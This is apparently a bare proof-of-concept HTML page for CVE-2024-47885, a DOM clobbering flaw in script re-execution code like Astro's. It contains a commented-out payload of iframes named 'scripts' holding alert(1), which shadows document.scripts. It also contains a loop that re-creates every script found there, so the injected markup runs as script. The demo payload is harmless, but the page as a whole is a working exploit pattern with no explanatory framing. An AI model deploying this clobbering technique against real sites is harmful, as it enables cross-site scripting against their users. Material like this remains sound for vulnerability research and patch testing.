<!DOCTYPE html>
<html>
<head>
    <title>CVE-2024-47885</title>
</head>
<body>
    /////clobbering payload/////
<!--     <iframe name="scripts">alert(1)</iframe>
    <iframe name="scripts">alert(1)</iframe> -->
    ///////////////////////////
  
    <script>
        var wait = Promise.resolve();
        var _loop_1 = function (script) {
            if (script.dataset.astroExec === '')
                return "continue";
            var type = script.getAttribute('type');
            if (type && type !== 'module' && type !== 'text/javascript')
                return "continue";
            var newScript = document.createElement('script');
            newScript.innerHTML = script.innerHTML;
            console.log(script.innerHTML);
            var _loop_2 = function (attr) {
                if (attr.name === 'src') {
                    var p_1 = new Promise(function (r) {
                        newScript.onload = newScript.onerror = r;
                    });
                    wait = wait.then(function () { return p_1; });
                }
                newScript.setAttribute(attr.name, attr.value);
            };
            for (var _b = 0, _c = script.attributes; _b < _c.length; _b++) {
                var attr = _c[_b];
                _loop_2(attr);
            }
            newScript.dataset.astroExec = '';
            script.replaceWith(newScript);
        };
        for (var _i = 0, _a = Array.from(document.scripts); _i < _a.length; _i++) {
            var script = _a[_i];
            _loop_1(script);
        }
        

        
    </script>
</body>
</html>
